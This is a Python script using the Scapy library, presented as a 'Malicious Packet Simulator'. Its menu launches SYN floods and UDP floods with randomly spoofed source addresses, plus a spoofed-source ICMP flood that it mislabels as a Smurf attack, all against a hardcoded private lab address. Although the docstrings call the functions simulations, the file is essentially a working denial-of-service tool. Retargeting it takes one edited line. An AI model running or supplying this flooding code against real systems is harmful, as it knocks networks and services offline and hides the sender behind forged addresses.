from scapy.all import *
import random
import time

# Target IP and MAC addresses
target_ip = "192.168.220.178"
gateway_ip = "192.168.220.173"

def send_syn_flood(target_ip, num_packets=100):
    """Simulate SYN Flood attack."""
    print("[+] Starting SYN Flood attack...")
    for i in range(num_packets):
        # Random source port and IP to mimic an attack
        ip_packet = IP(src=RandIP(), dst=target_ip)
        tcp_packet = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
        send(ip_packet/tcp_packet, verbose=0)
        print(f"[-] Packet {i+1}/{num_packets} sent.")
    print("[+] SYN Flood attack completed.")

def send_udp_flood(target_ip, num_packets=100):
    """Simulate UDP Flood attack."""
    print("[+] Starting UDP Flood attack...")
    for i in range(num_packets):
        # Random source port and data payload
        ip_packet = IP(src=RandIP(), dst=target_ip)
        udp_packet = UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535))
        payload = Raw(load="A"*1024)  # 1KB payload
        send(ip_packet/udp_packet/payload, verbose=0)
        print(f"[-] Packet {i+1}/{num_packets} sent.")
    print("[+] UDP Flood attack completed.")

def send_icmp_smurf(target_ip, gateway_ip, num_packets=100):
    """Simulate ICMP Smurf attack (spoofing IP to flood the target)."""
    print("[+] Starting ICMP Smurf attack...")
    for i in range(num_packets):
        ip_packet = IP(src=gateway_ip, dst=target_ip)
        icmp_packet = ICMP()
        send(ip_packet/icmp_packet, verbose=0)
        print(f"[-] Packet {i+1}/{num_packets} sent.")
    print("[+] ICMP Smurf attack completed.")

def main():
    print("Malicious Packet Simulator")
    print("[1] SYN Flood Attack")
    print("[2] UDP Flood Attack")
    print("[3] ICMP Smurf Attack")
    print("[4] Run All")
    choice = input("Select an attack type (1-4): ")

    try:
        num_packets = int(input("Enter the number of packets to send (e.g., 100): "))
    except ValueError:
        print("Invalid input. Using 100 packets.")
        num_packets = 100

    if choice == "1":
        send_syn_flood(target_ip, num_packets)
    elif choice == "2":
        send_udp_flood(target_ip, num_packets)
    elif choice == "3":
        send_icmp_smurf(target_ip, gateway_ip, num_packets)
    elif choice == "4":
        send_syn_flood(target_ip, num_packets)
        send_udp_flood(target_ip, num_packets)
        send_icmp_smurf(target_ip, gateway_ip, num_packets)
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
